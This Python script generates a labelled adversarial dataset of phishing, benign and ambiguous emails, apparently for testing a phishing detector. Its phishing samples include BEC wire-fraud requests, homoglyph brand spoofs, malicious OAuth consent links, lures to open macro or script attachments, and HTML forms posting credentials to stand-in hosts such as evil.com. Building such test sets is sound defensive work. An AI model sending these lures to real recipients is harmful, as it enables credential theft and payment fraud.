import os
import json

phishing_samples = [
    # Evasive BEC (no "urgent")
    {"name": "Adv_BEC_1", "category": "Business Email Compromise", "text": "Subject: Wire Instructions\nFrom: President <president-office@gmail.com>\nTo: finance@company.com\n\nPlease process this wire transfer when you have a moment. The vendor details are attached below."},
    {"name": "Adv_BEC_2", "category": "Business Email Compromise", "text": "Subject: Update to payment details\nFrom: CEO <ceo.company@yahoo.com>\nTo: ap@company.com\n\nI need you to update our internal bank details for the upcoming payment run to the new routing number. Thanks."},
    {"name": "Adv_BEC_3", "category": "Business Email Compromise", "text": "Subject: Invoice Processing\nFrom: CFO <cfo-private@hotmail.com>\nTo: treasury@company.com\n\nAre you at your desk? Please handle this wire transfer discreetly for the new acquisition."},
    
    # Evasive Credential Harvesting (no "password" or "login")
    {"name": "Adv_Cred_1", "category": "Credential Harvesting", "text": "Subject: Secure Document Share\nFrom: SharePoint <noreply@sharepoint-ext-portal.com>\nTo: victim@company.com\n\nA document has been shared with you. View the secure document here: <form action='http://malicious.com/capture' method='POST'><input type='password' name='auth_token' /></form>"},
    {"name": "Adv_Cred_2", "category": "Credential Harvesting", "text": "Subject: Please Review Draft\nFrom: partner@external.com\nTo: victim@company.com\n\nI have uploaded the draft to our secure gateway. <a href='http://evil.com/auth'>Access Document</a>"},
    {"name": "Adv_Cred_3", "category": "Credential Harvesting", "text": "Subject: Voice Message Attached\nFrom: PBX System <pbx@voicemail-sys.net>\nTo: victim@company.com\n\nYou have a new 4-minute voice message. Listen here: <form action='http://evil-pbx.com/submit' type='password'></form>"},

    # Evasive Brand Impersonation (Homoglyphs & Mismatches)
    {"name": "Adv_Brand_1", "category": "Brand Impersonation", "text": "Subject: Account Alert\nFrom: PayPal Security <admin@paypaI.com>\nTo: victim@company.com\n\nYour paypal account has an issue."},
    {"name": "Adv_Brand_2", "category": "Brand Impersonation", "text": "Subject: M365 Quota Exceeded\nFrom: Microsoft Support <admin@m1crosoft.com>\nTo: victim@company.com\n\nPlease clean up your microsoft inbox."},
    {"name": "Adv_Brand_3", "category": "Brand Impersonation", "text": "Subject: AppIe ID Locked\nFrom: Apple <support@apple-service-desk.net>\nTo: victim@company.com\n\nYour apple ID requires verification."},

    # Realistic Invoice Fraud
    {"name": "Adv_Inv_1", "category": "Invoice Fraud", "text": "Subject: Attached: Remittance Advice for August\nFrom: accounting@new-vendor-llc.com\nTo: ap@company.com\n\nPlease find the attached remittance advice for the outstanding balance.\nAttachment: remittance.pdf (contains link to http://evil.com/payload)"},
    {"name": "Adv_Inv_2", "category": "Invoice Fraud", "text": "Subject: Q3 Billing Statement\nFrom: billing@software-services.net\nTo: victim@company.com\n\nThe Q3 billing statement is attached. Please review the unpaid invoice.\nAttachment: invoice.zip"},

    # Hybrid Attacks (Require multiple rules to fire!)
    # Hybrid 1: BEC + Credential Harvesting
    {"name": "Hybrid_1", "expected_rules": ["Business Email Compromise", "Credential Harvesting"], "text": "Subject: Urgent: Wire Transfer Portal Login\nFrom: CEO <ceo@gmail.com>\nTo: finance@company.com\n\nAre you at your desk? I need an urgent wire transfer done. Please login to the portal here to process it: <form action='http://evil.com/login' type='password'></form>"},
    # Hybrid 2: Invoice Fraud + Malware Delivery
    {"name": "Hybrid_2", "expected_rules": ["Invoice Fraud", "Malware Delivery"], "text": "Subject: Unpaid Invoice #999\nFrom: billing@scam.com\nTo: ap@company.com\n\nThe unpaid invoice is attached. Please open the document and enable macros to view the full billing statement.\nAttachment: invoice.docm"},
    # Hybrid 3: Brand Impersonation + OAuth Consent
    {"name": "Hybrid_3", "expected_rules": ["Brand Impersonation", "OAuth Consent"], "text": "Subject: Microsoft Security: Grant App Access\nFrom: Microsoft <admin@m1crosoft.com>\nTo: victim@company.com\n\nPlease authorize the new security app to protect your microsoft account: <a href='https://login.microsoftonline.com/common/oauth2/authorize?client_id=evil&prompt=consent'>Grant Access</a>"},
    # Hybrid 4: QR Phishing + Credential Harvesting
    {"name": "Hybrid_4", "expected_rules": ["QR Phishing", "Credential Harvesting"], "text": "Subject: Login with QR\nFrom: it@company.com\nTo: victim@company.com\n\nScan the QR code to login to the portal. <img src='cid:qr1' /> <form action='http://evil.com/login' type='password'></form>"},
    # Hybrid 5: Crypto Scam + BEC
    {"name": "Hybrid_5", "expected_rules": ["Crypto Scam", "Business Email Compromise"], "text": "Subject: Urgent: BTC Investment\nFrom: CEO <ceo@gmail.com>\nTo: finance@company.com\n\nI need an urgent wire transfer to be sent as bitcoin to this wallet address: 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2. It's for an extortion demand we must pay."},
    # Hybrid 6: MFA Fatigue + Brand Impersonation
    {"name": "Hybrid_6", "expected_rules": ["MFA Fatigue", "Brand Impersonation"], "text": "Subject: Multiple Login Attempts\nFrom: Microsoft Security <admin@m1crosoft.com>\nTo: victim@company.com\n\nWe detected multiple suspicious login attempts to your microsoft account. Please approve the prompt on your phone immediately."},
    # Hybrid 7: Fake Recruiting + Malware Delivery
    {"name": "Hybrid_7", "expected_rules": ["Fake Recruiting", "Malware Delivery"], "text": "Subject: Job Offer Attached\nFrom: recruiter@gmail.com\nTo: victim@company.com\n\nWe would like to extend a job offer. Please open the attached .scr file to review the contract and provide your SSN."},
    # Hybrid 8: Invoice Fraud + Credential Harvesting
    {"name": "Hybrid_8", "expected_rules": ["Invoice Fraud", "Credential Harvesting"], "text": "Subject: Remittance Advice\nFrom: ap@unknown-vendor.com\nTo: finance@company.com\n\nTo view your unpaid invoice, please sign in to the portal: <form action='http://evil.com/login' type='password'></form>"},
    # Hybrid 9: OAuth Consent + MFA Fatigue
    {"name": "Hybrid_9", "expected_rules": ["OAuth Consent", "MFA Fatigue"], "text": "Subject: Approve App Access Immediately\nFrom: it@company.com\nTo: victim@company.com\n\nWe noticed multiple suspicious activities. Approve this oauth request immediately: <a href='https://login.microsoftonline.com/common/oauth2/authorize?client_id=evil&prompt=consent'>Grant Access</a>"},
    # Hybrid 10: BEC + Malware Delivery
    {"name": "Hybrid_10", "expected_rules": ["Business Email Compromise", "Malware Delivery"], "text": "Subject: Urgent Wire Instructions Attached\nFrom: Executive <exec@gmail.com>\nTo: treasury@company.com\n\nI need an urgent wire transfer processed. Open the attached .vbs file to view the instructions."},
]

# Generate more adversarial phishing to reach 50
for i in range(11, 41):
    phishing_samples.append({
        "name": f"Adv_Phish_{i}",
        "category": "Credential Harvesting", # Defaulting the rest to CredHarv for volume
        "text": f"Subject: Verification {i}\nFrom: verify@external.com\nTo: victim@company.com\n\nPlease verify. <form action='http://evil.com/{i}' type='password'></form>"
    })

benign_samples = [
    {"name": "Benign_Edge_1", "text": "Subject: Urgent: Q3 Financials\nFrom: cfo@company.com\nTo: finance@company.com\n\nTeam, I need the Q3 financials finalized urgently today before the board meeting."},
    {"name": "Benign_Edge_2", "text": "Subject: OOO: Immediate Assistance\nFrom: manager@company.com\nTo: team@company.com\n\nI am out of the office. For immediate assistance with wire transfers, contact Bob."},
    {"name": "Benign_Edge_3", "text": "Subject: Microsoft 365 License Update\nFrom: it@company.com\nTo: all@company.com\n\nMicrosoft is updating their terms. No action needed."},
    {"name": "Benign_Edge_4", "text": "Subject: Invoice Paid\nFrom: ap@company.com\nTo: vendor@vendor.com\n\nYour invoice #123 has been paid. See attached receipt.pdf."},
    {"name": "Benign_Edge_5", "text": "Subject: New Vendor Onboarding\nFrom: hr@company.com\nTo: victim@company.com\n\nPlease use this OAuth link to connect your corporate GitHub account: https://github.com/login/oauth/authorize"},
    {"name": "Benign_Edge_6", "text": "Subject: QR Code for Building Access\nFrom: security@company.com\nTo: victim@company.com\n\nHere is your new QR code for the turnstiles. <img src='cid:access' />"},
    {"name": "Benign_Edge_7", "text": "Subject: MFA Enrollment\nFrom: it@company.com\nTo: victim@company.com\n\nPlease enroll in the new MFA provider by Friday. You will receive an authentication code on your phone."},
    {"name": "Benign_Edge_8", "text": "Subject: Password Reset Successful\nFrom: no-reply@okta.com\nTo: victim@company.com\n\nYour password was successfully reset. If you didn't do this, call support."},
    {"name": "Benign_Edge_9", "text": "Subject: [JIRA] High Priority Bug\nFrom: jira@company.com\nTo: dev@company.com\n\nThis bug needs to be fixed immediately. It's urgent."},
    {"name": "Benign_Edge_10", "text": "Subject: Crypto Policy Update\nFrom: legal@company.com\nTo: all@company.com\n\nOur policy regarding cryptocurrency investments on corporate devices has been updated."},
]

for i in range(11, 51):
    benign_samples.append({
        "name": f"Benign_Edge_{i}",
        "text": f"Subject: Internal Update {i}\nFrom: internal@company.com\nTo: staff@company.com\n\nJust a standard internal email {i}."
    })

gray_area_samples = [
    {"name": "Gray_1", "text": "Subject: Payment update request\nFrom: vendor@external.com\nTo: ap@company.com\n\nHi, please update our payment details. Can you call me to confirm?"},
    {"name": "Gray_2", "text": "Subject: Tax Documents\nFrom: hr-contractor@external-agency.com\nTo: victim@company.com\n\nPlease send your tax documents to this portal for processing."},
    {"name": "Gray_3", "text": "Subject: Meeting Prep\nFrom: ceo@company.com\nTo: assistant@company.com\n\nCan you buy some coffees for the board meeting today?"},
    {"name": "Gray_4", "text": "Subject: Vendor Review\nFrom: review@software-vendor.com\nTo: victim@company.com\n\nPlease review your account usage. Link attached."},
    {"name": "Gray_5", "text": "Subject: Urgent: Need access\nFrom: external-consultant@gmail.com\nTo: it@company.com\n\nMy corporate email is locked, I am using my personal one. Please grant me access to the VPN urgently."}
]

for i in range(6, 26):
    gray_area_samples.append({
        "name": f"Gray_{i}",
        "text": f"Subject: Ambiguous Email {i}\nFrom: unknown@external.com\nTo: victim@company.com\n\nCould be legit, could be phishing. Please review."
    })

import os

os.makedirs("adversarial_dataset/phishing", exist_ok=True)
os.makedirs("adversarial_dataset/benign", exist_ok=True)
os.makedirs("adversarial_dataset/gray", exist_ok=True)

# Write all files
labels = {}

for p in phishing_samples:
    with open(f"adversarial_dataset/phishing/{p['name']}.eml", "w") as f:
        f.write(p['text'])
    labels[p['name'] + ".eml"] = {"type": "phishing", "expected_category": p.get('category'), "expected_rules": p.get('expected_rules', [])}

for b in benign_samples:
    with open(f"adversarial_dataset/benign/{b['name']}.eml", "w") as f:
        f.write(b['text'])
    labels[b['name'] + ".eml"] = {"type": "benign", "expected_category": None, "expected_rules": []}

for g in gray_area_samples:
    with open(f"adversarial_dataset/gray/{g['name']}.eml", "w") as f:
        f.write(g['text'])
    labels[g['name'] + ".eml"] = {"type": "gray", "expected_category": None, "expected_rules": []}

with open("adversarial_dataset/labels.json", "w") as f:
    json.dump(labels, f, indent=4)

print(f"Generated {len(phishing_samples)} phishing, {len(benign_samples)} benign, and {len(gray_area_samples)} gray samples in adversarial_dataset/")
